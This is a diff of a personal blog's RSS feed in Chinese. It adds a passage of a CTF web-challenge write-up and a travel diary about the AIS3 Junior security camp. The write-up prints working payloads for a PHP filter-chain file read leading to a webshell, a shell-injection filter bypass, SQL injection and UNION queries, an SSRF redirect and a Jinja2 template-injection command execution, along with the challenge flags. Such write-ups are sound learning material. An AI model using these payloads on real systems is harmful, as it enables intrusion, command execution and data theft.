onvert.iconv.CSISO103T618BIT.BIG5-HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.iconv.OSF00010009.ISO2022JP2|convert.iconv.UTF16.ISO-10646/UTF-8|convert.iconv.UTF-16.UTF8|convert.iconv.ISO_8859-14:1998.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-103.CSEUCPKDFMTJAPANESE|convert.iconv.OSF00010002.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.CSEUCKR.UTF-32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UK.852|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.ISO6937.UCS-2LE|convert.iconv.CP864.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.OSF00010104|convert.iconv.CP860.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UTF-32BE.MS936|convert.iconv.8859_5.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-90.UTF16LE|convert.iconv.IBM874.UNICODEBIG|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-103.ISO-IR-209|convert.iconv.8859_5.CSISO2022JP2|convert.iconv.ISO-2022-JP-3.IBM-943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd;&lt;br&gt;
+:::&lt;br&gt;
+最後在後面加上&lt;code&gt;1=os.system(&#39;&#39;)&lt;/code&gt;就可以拿到webshell&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1FrcQuuel.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{w385h311_15_4_427}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;dig-waf2&#34;&gt;dig-waf2
+&lt;/h3&gt;&lt;p&gt;看到code知道ban了這些&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJJHdED_gl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$blacklist = [&amp;#39;|&amp;#39;, &amp;#39;&amp;amp;&amp;#39;, &amp;#39;;&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;lt;&amp;#39;, &amp;#34;\n&amp;#34;, &amp;#34; &amp;#34;, &amp;#39;flag&amp;#39;];
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;那綜合以上黑名單，可以拼出 &lt;code&gt;payload=&#39;`cat${IFS}/f*`&#39;&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/rJcL18v_ll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{d19_70015_15_m491c!}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;login&#34;&gt;login
+&lt;/h3&gt;&lt;p&gt;進來後打開Magic會有這個&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BkurzmOOxl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+那就看這個湊出payload&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/rkHcf7_dgx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+前面有&lt;code&gt;&#39;&lt;/code&gt;和&lt;code&gt;)&lt;/code&gt;要閉合，所以payload是&lt;code&gt;admin&#39;) OR 1=1 --#&lt;/code&gt;&lt;br&gt;
+然後密碼隨便打&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/Syc7mQddeg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{SQL1nj3c710n_1s_S0_l33t}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;sqli-unoin&#34;&gt;sqli unoin
+&lt;/h3&gt;&lt;p&gt;都說是UNION了一開始進去就先用UNION看欄位數，測出來有三欄&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJW8XNOOgg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+下面有提示&lt;code&gt;table:flags column:flag_value&lt;/code&gt;&lt;br&gt;
+所以payload是&lt;code&gt;https://chall.nckuctf.org:28303/?id=-1 UNION SELECT 1,flag_value,3 FROM flags--&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1HbVEu_lx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{UNION_SELECT_FOO_FROM_BAR}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;ssrf2&#34;&gt;ssrf2
+&lt;/h3&gt;&lt;p&gt;進去後看到source code要用httpbin.dev去碰內網的/internal-only&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyGoTNd_ll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+所以payload是&lt;code&gt;https://httpbin.dev/redirect-to?url=http://0/internal-only&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyNTT4dOge.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{y0u_4r3_r34lly_4_55rf_0p3n_r3d1r3c7_m4573r}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;ssti-waf1&#34;&gt;SSTI-waf1
+&lt;/h3&gt;&lt;p&gt;進去後看到source code有擋&lt;code&gt;_&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HynXj7Odxx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+那就找一個沒_的payload&lt;br&gt;
+payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()}}&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BkUPi7_Olg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+最後&lt;code&gt;cat /flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1m9jXuulx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{SSTI_can_use_without__}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>2025 AIS3 Junior 心得</title>
+        <link>https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/</link>
+        <pubDate>Wed, 13 Aug 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/</guid>
+        <description>&lt;img src="https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 Junior 心得" /&gt;&lt;h1 id=&#34;day-0&#34;&gt;Day 0
+&lt;/h1&gt;&lt;p&gt;這天蠻早就從 COSCUP 離開南下了（為了直達車，真的超快&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1.png&#34;
+	width=&#34;927&#34;
+	height=&#34;535&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_babe71d045664c90.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-1_hu_b7bbb1b94ecfe129.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;高鐵時刻表&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
+		data-flex-basis=&#34;415px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5.jpg&#34;
+	width=&#34;2048&#34;
+	height=&#34;1536&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_af401f887aaae84b.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/5_hu_3465c0e82947d423.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;應該是台中?&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;133&#34;
+		data-flex-basis=&#34;320px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;到成大之後就到飯點啦，但兩個助教都還沒來，所以我就帶另一個組員混入其他組一起吃飯&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2.png&#34;
+	width=&#34;784&#34;
+	height=&#34;266&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_ee111eb5c506c578.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-2_hu_2e1decde96437509.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;294&#34;
+		data-flex-basis=&#34;707px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_ec11698e61685de1.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/6_hu_59bc67b3d24cbf7a.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;晚餐，後面惡夢的開始。元味屋和風洋食&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/4iphDfHaXEv6QzB16&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;元味屋和風洋食&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;回去後看到大家都在卷專題我們也小小討論了一下要幹嘛，就變成 TA 們的遊戲空間了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_55706e787dd2667d.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/9_hu_2d077fe48495da27.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;TA 們玩某款美少女遊戲&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;day-1&#34;&gt;Day 1
+&lt;/h1&gt;&lt;p&gt;上課部分沒啥特別的，吃的部分成大附近真的是美食天堂，跟兩個禮拜前的比根本不同等級&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_3cbd6d1748d3bc5a.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/4_hu_72d87226f0511789.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;午餐。井選日式定食teisyoku tainan&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/rQBV5TVr8Kgd4RPu6&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;井選日式定食teisyoku tainan&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;回去討論跟做一下專題，我記得蠻快的一下就快做完了，後來就去了早上沒去到的&lt;/p&gt;
+&lt;h1 id=&#34;day-2&#34;&gt;Day 2
+&lt;/h1&gt;&lt;p&gt;第二天記得的東西不多，但有個印象深刻的事情，還記得前面被我拍很醜的漢堡排嗎，第二次去吃的時候他在我的肚子大逆襲（笑死是我自己沒注意&lt;br&gt;
+看到漢堡排有一點微微粉紅但我還是吃下去了&lt;br&gt;
+後來是急性腸胃炎，吃啥拉啥，沒吃也拉，後面幾天超難受&lt;br&gt;
+但還是要去吃早上沒去到的&lt;a class=&#34;link&#34; href=&#34;https://maps.app.goo.gl/AmhBAreU4wRBUTm88&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;勝利早點&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_805db4aa63a782ce.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/3_hu_5d067295ed50a0c8.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;這…..就是台南嗎？&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8.jpg&#34;
+	width=&#34;1080&#34;
+	height=&#34;1920&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_2797fc2695e26525.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/8_hu_b1da9394274ed053.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;吃起來普普通通但蠻便宜的&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;56&#34;
+		data-flex-basis=&#34;135px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;day-3&#34;&gt;Day 3
+&lt;/h1&gt;&lt;p&gt;就上課，但。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_d1ff8246fc5e62bf.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/2_hu_3393b3d331d7e91d.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;嗚嗚嗚嗚嗚嗚嗚嗚真難過&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3.png&#34;
+	width=&#34;1799&#34;
+	height=&#34;1560&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_a31e94b9ab2b9f0e.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_ef64e3e75d65acad.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Ya! 不用肚子痛還要熬夜做簡報了&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;115&#34;
+		data-flex-basis=&#34;276px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h1 id=&#34;day-46&#34;&gt;Day 4~6
+&lt;/h1&gt;&lt;p&gt;廢了一下就跑去 HITCON 玩，還拿了瓶 DEVCORE CONFERENCE 沒拿到的酒（但那時候也沒滿 18&lt;br&gt;
+這兩個 Conf 文章我會盡快補上 QAQ&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1.jpg&#34;
+	width=&#34;1536&#34;
+	height=&#34;2048&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_a6b44e25dff1788c.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_c8eae1dd229792d.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;時隔五個月又拿到了&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;75&#34;
+		data-flex-basis=&#34;180px&#34;
 	
 &gt;&lt;/p&gt;
 </description>
@@ -1012,7 +1832,8 @@ exploit：&lt;/p&gt;
         <pubDate>Sat, 12 Apr 2025 21:52:19 +0800</pubDate>
         
         <guid>https://agong88.github.io/post/hello-world/</guid>
-        <description>&lt;p&gt;8/18 更：我會減少拖延症，多產出文章&lt;/p&gt;
+        <description>&lt;p&gt;10/24 更：我會減少拖延症，多產出文章&lt;br&gt;
+買了 PM3，有空多更新反體中文技術文章上來&lt;/p&gt;
 &lt;p&gt;另外我在做這Blog的時候不知道哪根腦筋不對做了雙語言，雖然更新起來要花些時間，但看起來蠻不錯的（對吧？&lt;/p&gt;
 </description>
         </item>
